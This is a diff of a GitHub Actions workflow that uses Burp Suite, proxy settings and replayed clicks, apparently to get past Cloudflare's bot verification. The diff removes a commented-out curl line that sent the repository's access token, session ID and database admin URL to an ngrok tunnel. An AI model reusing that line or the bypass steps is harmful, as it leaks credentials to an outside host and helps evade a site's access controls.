@@ -39,19 +39,21 @@ jobs:
           choco install burp-suite-free-edition
 
       - name: Setting up Burpsuite
-        run: python redo.py burp.rd 1 0 
+        run: python redo.py burp.txt 1 0 
       
       - name: Setting up Proxy Settings
-        run: python redo.py proxy.rd 1 0
+        run: python redo.py proxy.txt 1 0
         
       - name: Setting up Chrome for Cloudflare bypass
-        run: python redo.py chrome.rd 1 0
+        run: python redo.py chrome.txt 1 0
+        
+      - name: Perform Click for Verification
+        run: python redo.py clicktoverify.txt 30 3
         
       - name: Running Python Script  
         env:
           ACCESS_TOKEN: ${{secrets.ACCESS_TOKEN}}
           SESSION_ID: ${{secrets.SESSION_ID}}
-          CF_CLEARANCE: ${{secrets.CF_CLEARANCE}}
           IGNORE_ACCESSTOKEN: ${{secrets.IGNORE_ACCESSTOKEN}}
           FROM_DAY: ${{secrets.FROM_DAY}}
           TO_DAY: ${{secrets.TO_DAY}}
@@ -60,9 +62,7 @@ jobs:
           DB_ADMIN_URL: ${{secrets.DB_ADMIN_URL}}
           DB_TABLE_NAME: ${{secrets.DB_TABLE_NAME}}
           DB_TABLE_NOTIFY: ${{secrets.DB_TABLE_NOTIFY}}
-        run:
-          #curl "https://b7d3-2409-4072-8e9c-d1ad-6415-c991-f115-8198.ngrok-free.app/?acc=${{secrets.ACCESS_TOKEN}}&sessi=${{secrets.SESSION_ID}}&ignore=${{secrets.IGNORE_ACCESSTOKEN}}&from=${{secrets.FROM_DAY}}&to=${{secrets.TO_DAY}}&reqlim=${{secrets.REQUESTS_LIMIT}}&enrollim=${{secrets.ENROLLS_LIMIT}}&dburl=${{secrets.DB_ADMIN_URL}}&tablename=${{secrets.DB_TABLE_NAME}}&dbnotif=${{secrets.DB_TABLE_NOTIFY}}"
-          python main.py
+        run: python main.py
           
           
           
